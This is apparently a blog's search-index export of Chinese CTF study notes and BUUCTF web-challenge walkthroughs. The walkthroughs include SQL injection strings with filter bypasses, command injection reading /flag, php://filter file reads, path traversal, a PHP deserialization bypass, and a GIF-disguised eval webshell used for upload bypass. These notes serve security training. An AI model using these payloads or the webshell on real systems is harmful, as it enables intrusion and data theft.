加法</p><p>，&gt;,,&gt;++++++++[&lt;——&lt;——&gt;&gt;-]&lt;&lt;[&gt;[&gt;+&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]&lt;&lt;&lt;-]&gt;&gt;&gt;++++++[&lt;++++++++&gt;-],&lt;.&gt;.    乘法</p><p>，&gt;,&gt;++++++[-&lt;——–&lt;——–&gt;&gt;] 除法</p><p>eg:<img src="https://blue-blue-blue-blue.github.io/img/b31.png" width ="60%"></p></blockquote><blockquote><h2 id="盲文"><a href="#盲文" class="headerlink" title="盲文"></a>盲文</h2><img src="https://blue-blue-blue-blue.github.io/img/b32.png" width ="60%"></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web key</title>
      <link href="/2022/09/21/web-key/"/>
      <url>/2022/09/21/web-key/</url>
      
        <content type="html"><![CDATA[<blockquote><p>万能密码</p><p>以 x’ or’ 1 为例，当输入密码后，sql语句变为SELECT * FROM admin WHERE Username&#x3D; ‘用户名’ AND password&#x3D;’ <u>x’ or’  1</u> ‘    由于单引号的插入，且优先级not&gt;and&gt;or，语句变为<u>……AND password&#x3D;’x’</u>   or   <u>‘1’</u>   ,or后的语句恒为真,整条语句为真。  </p><p>同理，用户名输入1’ or 1 or ‘1’&#x3D;’1，语句…<u>Username&#x3D;’  1′</u> or <u>1</u> or <u>‘1’&#x3D;’1’</u> AND…… ,整条语句为真。   </p><p>（疑问：以buuctf  EasySQL1为例，用户名输1’ or ’1或者1’ or ‘1’&#x3D;’1显示错误）  </p><p>（解答：and的优先级比or高，0 or 1 and 0 等于 0 or 0 等于0 ）</p></blockquote><blockquote><p>注释</p><p>注释里有可能会有提示，如源码注释标有source.php,则需在url后加source.php进行查看</p></blockquote><blockquote><p>php  函数</p><blockquote><p>isset函数</p><p>如果指定变量存在且不为 NULL，则返回 TRUE，否则返回 FALSE。</p><p>如果一次传入多个参数，那么 isset() 只有在全部参数都被设置时返回 TRUE，计算过程从左至右，中途遇到没有设置的变量时就会立即停止。  </p></blockquote><blockquote><p>urldecode()函数</p><p>urldecode() 解码 URL 字符串函数。</p></blockquote><blockquote><p>substr函数  </p><p>SUBSTR() 函数从字符串中提取子字符串（从任意位置开始）。</p><p>语法：SUBSTR(<em>string</em>, <em>start</em>, <em>length</em>)  或者 SUBSTR(<em>string</em> FROM <em>start</em> FOR <em>length</em>)</p><p>length要提取的字符数。 如果省略，将返回整个字符串（从 <em>start</em> 位置开始）  </p></blockquote><blockquote><p>strpos函数</p><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p><p>语法：strpos(string,find,start)</p><p>stripos()- 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p><p>strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</p><p>strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p></blockquote></blockquote><blockquote><p>文件包含漏洞</p></blockquote><blockquote><p>php封装协议</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php<br>php:&#x2F;&#x2F;filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字filter，可以很容易想到这个协议可以用来过滤一些东西； 使用不同的参数可以达到不同的目的和效果：<br>resource&#x3D;&lt;要过滤的数据流&gt; 指定了你要筛选过滤的数据流。 必选<br>read&#x3D;&lt;读链的筛选列表&gt;可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选<br>write&#x3D;&lt;写链的筛选列表&gt; 可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选<br>&lt;；两个链的筛选列表&gt; 任何没有以 read&#x3D; 或write&#x3D;作前缀 的筛选器列表会视情况应用于读或写链。<br>php:&#x2F;&#x2F;filter与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。<br>read&#x3D;convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</p></blockquote></blockquote><blockquote><p>Ping</p><p>ls（英文全拼：list files）：用于显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)</p><p>cat（英文全拼：concatenate）：用于连接文件并打印到标准输出设备上。</p><p>eg:输入<b>127.0.0.1|ls</b> 查看该文件的目录,输入<b>127.0.0.1|ls &#x2F;</b>查看上级目录，发现了flag文件，输入<b>127.0.0.1|cat &#x2F;flag</b>获取flag文件  </p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WEB-BUUCTF</title>
      <link href="/2022/09/21/WEB-BUUCTF/"/>
      <url>/2022/09/21/WEB-BUUCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="第一页"><a href="#第一页" class="headerlink" title="第一页"></a>第一页</h1><h2 id="极客大挑战-2019-EasySQL-1"><a href="#极客大挑战-2019-EasySQL-1" class="headerlink" title="[极客大挑战 2019]EasySQL 1"></a>[极客大挑战 2019]EasySQL 1</h2><p>用户名随意输，密码输入万能密码即可  </p><img src="https://blue-blue-blue-blue.github.io/img/a1.jpg" width ="60%">   <h2 id="HCTF-2018-WarmUp-1"><a href="#HCTF-2018-WarmUp-1" class="headerlink" title="[HCTF 2018]WarmUp 1"></a>[HCTF 2018]WarmUp 1</h2><p>ctrl+u查看源码，看到提示“source.php”   </p><img src="https://blue-blue-blue-blue.github.io/img/a2.jpg" width ="60%">    <p>代码审计，url后加?file&#x3D;source.php%253..&#x2F;(*n)flag  ，最后加了5个..&#x2F;得到flag</p><img src="https://blue-blue-blue-blue.github.io/img/a3.jpg" width ="60%">  <h2 id="Havefun-1"><a href="#Havefun-1" class="headerlink" title="Havefun 1"></a>Havefun 1</h2><p>查看源码，在注释看见提示信息，在url&#x2F;后加?cat&#x3D;dog，即get传参即可得到flag</p><img src="https://blue-blue-blue-blue.github.io/img/a4.jpg" width ="60%">  <h2 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h2><p>出现了flag.php文件，?file&#x3D;flag.php 猜测文件包含漏洞，此时就要想办法查看这个文件。将url改为xxxx.node4.buuoj.cn:81&#x2F;&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><img src="https://blue-blue-blue-blue.github.io/img/a5.png" width ="60%"><h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><p>输入<b>127.0.0.1|ls</b> 查看该文件的目录，只有一个index.php,输入<b>127.0.0.1|ls &#x2F;</b>查看上级目录，发现了flag文件，输入<b>127.0.0.1|cat &#x2F;flag</b>获取这个文件  </p><img src="https://blue-blue-blue-blue.github.io/img/a6.png" width ="60%"><h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>查询字段数：输入<b>1’ order by 1 #</b>，<b>1’ order by 2 #</b>，当输入<b>1’ order by 3 #</b>报错，则字段数为3</p><img src="https://blue-blue-blue-blue.github.io/img/a7.png" width ="60%"><p>union注入：输入<b>1’ union select 1,2#</b> 回显了过滤的关键字</p><img src="https://blue-blue-blue-blue.github.io/img/a8.png" width ="60%"><p>爆数据库：输入<b>1’; show databases; #</b> </p><img src="https://blue-blue-blue-blue.github.io/img/a9.png" width ="60%"><p>爆表：输入<b>1’; show tables; #</b> ,有两个表”words”和”1919810931114514”,    输入<b>1’; show columns from words; #</b>爆words表,</p><p>输入<b>1’; show columns from `1919810931114514&#96;; #</b> 爆”1919810931114514”表，发现flag文件，想办法提取出来</p><img src="https://blue-blue-blue-blue.github.io/img/a10.png" width ="60%"><p>提取flag：</p><p><b>法一</b>：输入<b>1’; rename table words to word1; rename table `1919810931114514&#96; to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</b></p><p>即：通过 rename 先把 words 表改名为其他的表名。  把 1919810931114514 表的名字改为 words 。 给新 words 表添加新的列名 id    将 flag 改名为 data 。(分析一下，原来输出的结果可能就是words表中的内容，然后把flag的表明改成words，就直接输出flag了)</p><p><b>法二</b> :输入<b>;SeT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</b>      (ps:提交点两下)</p><p>即因select被过滤了，所以先将select * from  `1919810931114514&#96; 进行16进制编码得到0x73656c656374202a2066726f6d20603139313938313039333131313435313460再通过构造payload得。</p><p><b>法三</b>：输入<b>1’; handler `1919810931114514` open as `a`; handler `a` read next;#</b> 或者<b>handler `1919810931114514` open;handler `1919810931114514&#96; read next;#</b> </p><h2 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h2><p>输入1，有内容，输入2，3….1 order by 1…都显示nonono</p><p>爆数据库：输入1;show databases;#    爆表：输入1;show tables;#  爆FLAG表1;show columns from Flag;#显示nonono,猜测有被过滤</p><p>由于本题没有过滤* ，用* 查询flag中的所有字段，所以直接构造payload为：*,1</p><img src="https://blue-blue-blue-blue.github.io/img/a11.png" width ="60%"><h2 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h2><p>在url后接？127.0.0.1回显成功     查看所有文件&#x2F;?ip&#x3D;127.0.0.1|ls有两个文件。由于过滤了空格，输入？ip&#x3D;127.0.0.1|cat$IFS$9index.php查看到index.php文件，里面有过滤信息。输入&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$9fla$a.php提取flag文件，查看源码就行</p><img src="https://blue-blue-blue-blue.github.io/img/a12.png" width ="60%"><h2 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h2><p>题目打开是一个全黑的页面，点击鼠标右击不放，拖到下方发现“You found me”,点进去，发现又有一个链接按钮，点进去，提示内容应该倒回去查，</p><img src="https://blue-blue-blue-blue.github.io/img/a13.png" width ="60%"><p>返回上一个页面用bp抓包(用点击按钮后抓到的包)，提示secr3t.php ，进入secr3t.php 发现有flag.php ,进入后没有发现，构造password，在url后接<b>&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</b> ,将页面最下方得到的东西base64解码即可</p><img src="https://blue-blue-blue-blue.github.io/img/a14.png" width ="60%"><h2 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h2><p>用万能密码尝试，得到的东西不是flag。题目有SQL，则考量SQL注入。</p><p>联合查询：直至密码栏输入**1’ union select 1，2，3#**有回显。</p><p>爆数据库：密码栏输入<strong>1’ union select 1,2,database()#</strong> ，得到数据库名为geek</p><p>爆表名：**1’ union select 1,2,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1#**爆出表名为geekuser</p><p>**1’ union select 1,2,table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1#**爆出表名为l0ve1ysq1</p><p>爆列名：**1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’l0ve1ysq1’ #**得到id,username,password</p><p>爆数据：在url后接**&#x2F;check.php?username&#x3D;1&amp;password&#x3D;1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23** 得到flag</p><h2 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h2><p>以Syc为webshell密码，打开菜刀。在根目录下就有flag文件，打开即可</p><h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><p>查看文件源码，发现有href的Secret.php，进入Secret.php，提示It doesn’t come from ‘ <a href="https://sycsecret.buuoj.cn&/#39;,%E7%94%A8bp%E6%8A%93%E5%8C%85%EF%BC%8C%E6%B7%BB%E5%8A%A0Referer%EF%BC%9Ahttps://Sycsecret.buuoj.cn%EF%BC%8C%E8%BF%9B%E5%85%A5%E5%90%8E%E6%8F%90%E7%A4%BAPlease">https://Sycsecret.buuoj.cn&#39;,用bp抓包，添加Referer：https://Sycsecret.buuoj.cn，进入后提示Please</a> use “Syclover” browser，添加<strong>User-Agent:Syclover</strong> ，进入后提示No!!! you can only read this locally!!!：不! !您只能在本地阅读!!，添加<strong>X-Forwarded-For:127.0.0.1</strong>，得到flag</p><img src="https://blue-blue-blue-blue.github.io/img/a15.png" width ="60%"><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>创建一个木马文件1.phtml，内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;a&#x27;]);&lt;/script&gt; </span><br></pre></td></tr></table></figure><p>上传时抓包，显示Not image!  把抓到的包的Content-Type的内容为 image&#x2F;jpeg，显示上传成功，用蚁剑连接，url地址为url+&#x2F;upload&#x2F;1.phtml,连接密码是a，进入后在根目录里找到flag</p><img src="https://blue-blue-blue-blue.github.io/img/a16.png" width ="60%"><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>创建一个木马文件1.jpg，内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;a&#x27;]);&lt;/script&gt; </span><br></pre></td></tr></table></figure><p>上传时抓包，把抓到的包的文件名改为1.phtml(不改应该也行)，显示<strong>上传成功&#x2F;uplo4d&#x2F;b284530b9d2636c66a4e6f32315ccac3.phtml</strong>，用蚁剑连接，url地址为url+&#x2F;uplo4d&#x2F;b284530b9d2636c66a4e6f32315ccac3.phtml,连接密码是a，进入后在根目录里找到flag</p><h2 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h2><p>常规注入：<code>/check.php?username=admin&amp;password=1&#39; union select 1#</code>，报错，猜测过滤了union和select</p><p>双写绕过：<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1#</code> 继续报错</p><p>url编码： <code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1%23</code> 有回显</p><p>试列数：<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,3%23</code> 试到3成功，显示出现回显位置是2和3</p><p>爆数据库:<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata) %23</code> 猜测在ctf库里</p><p>爆表：<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2, group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=&quot;ctf&quot; %23</code>,表名为Flag</p><p>查字段名：<code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=&quot;Flag&quot;%23</code> 显示Your password is ‘flag’<br>得flag:<code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(flag) frfromom(ctf.Flag)%23</code></p><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>扫后台，进入&#x2F;<a href="http://www.zip下载文件，代码审计，当password=100，username=admin，可以获得flag。反序列化后得O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}，绕过wakeup(**当成员属性数目大于实际数目时可绕过wakeup方法**,用序列化加%00替代\0)">www.zip下载文件，代码审计，当password=100，username=admin，可以获得flag。反序列化后得O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}，绕过wakeup(**当成员属性数目大于实际数目时可绕过wakeup方法**,用序列化加%00替代\0)</a>,</p><p>构造payload：<code>/?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</code></p><img src="https://blue-blue-blue-blue.github.io/img/a17.png" width ="60%"><h2 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h2><p>扫后台，进入&#x2F;index.php.bak,代码审计通过key变量get传参，要求此变量必须是数字，且取整数之后值为123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3，取key的值为123 。url&#x2F;?key&#x3D;123即可</p><img src="https://blue-blue-blue-blue.github.io/img/a18.png" width ="60%"><h2 id="Easy-Calc"><a href="#Easy-Calc" class="headerlink" title="Easy Calc"></a>Easy Calc</h2><p>查看源码，提示WAF,url:”calc.php?num&#x3D;”+encodeURIComponent($(“#content”).val())。</p><p>由于“&#x2F;”被过滤了，所以我们可以使用chr(47)来进行表示，进行目录读取：<br> <code>calc.php? num=1;var_dump(scandir(chr(47)))</code>提示f1agg</p><p>构造payload：<code>calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p><img src="https://blue-blue-blue-blue.github.io/img/a19.png" width ="60%"><h2 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h2><p>点击右上角菜单,进payflag，查看页面源码，提示：修改user,password&#x3D;404a,money&#x3D;1000000000,调出开发者页面，点击存储，修改user的值为1，刷新页面，提示输入密码，post传密码，提示传money,post传递后显示位数过长，传password&#x3D;404a&amp;money&#x3D;1e9</p><img src="https://blue-blue-blue-blue.github.io/img/a20.png" width ="60%"><h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p>由flag.txt和hint.txt得，只要构造 filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;就可得flag。查一下 “render” ,“tornado”这两个关键字得知是py模板注入。报错注入&#x2F;error?msg&#x3D;得到cookie_secret的值，将其后接**&#x2F;fllllllllllllag**的md5加密后的密文再md5加密得到filehash的值</p><img src="https://blue-blue-blue-blue.github.io/img/a21.png" width ="60%">]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
